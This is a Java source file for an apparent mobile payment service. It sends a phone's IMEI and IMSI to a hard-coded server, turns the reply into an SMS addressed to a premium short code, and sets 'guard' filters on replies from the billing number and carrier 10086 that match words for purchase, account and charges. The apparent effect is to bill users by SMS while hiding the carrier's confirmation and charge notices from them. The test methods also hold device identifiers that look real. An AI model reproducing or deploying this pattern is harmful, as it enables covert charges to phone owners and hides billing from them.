package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://218.241.153.11/link/get103mmmsg.php?cmd=4&price=10&g=12&f=22&imei=864178021560106&imsi=460029915257121&phone=13800000000
 * @author leoliu
 *
 */
public class XmwtMm6DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtMm6";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "10658424";
	
	private static final String REQUESTMODEL = "cmd={cmd}&price={price}&g={g}&f={f}&imei={imei}&imsi={imsi}&phone=13800000000";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String cmd = map.get("cmd");
			String price = map.get("price");
			String g = map.get("g");
			String f = map.get("f");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{cmd}",cmd).replace("{price}",price).replace("{g}",g).replace("{f}",f).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt,map);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseTxt,Map<String,String> map){
		
		if(responseTxt != null && responseTxt.length() > 10){
			
			try{
				String dest = map.get("dest");
				
				if(dest == null || dest.length() == 0){
					dest = DEST;
				}
				
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(responseTxt);
				sms.setSmsDest(dest);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		test1();
	}
	
	private static void test2(){
		String url = "http://218.241.153.11/jd/getjdmsg8.php";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "xmwtDm");
		map.put("channel", "10B101a87654322");
		map.put("cmd", "4");
		map.put("price", "8");
		map.put("g", "12");
		map.put("f","22");
		map.put("imsi","460025399810374");
		map.put("imei","862594025131367");
		map.put("dest", "1065843107");
		
		System.out.println(new XmwtMm6DynamicService().dynamic(map));
	}
	
	/**
	 * http://218.241.153.11/link/get103mmmsg.php?cmd=4&price=10&g=12&f=22&imei=864178021560106&imsi=460029915257121&phone=13800000000
	 */
	private static void test1(){
		String url = "http://218.241.153.11/mm/getmmmsg5.php";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "xmwtMm6");
		map.put("channel", "10B101a87654322");
		map.put("cmd", "4");
		map.put("price", "5");
		map.put("g", "12");
		map.put("f","22");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		
		System.out.println(new XmwtMm6DynamicService().dynamic(map));
	}

}
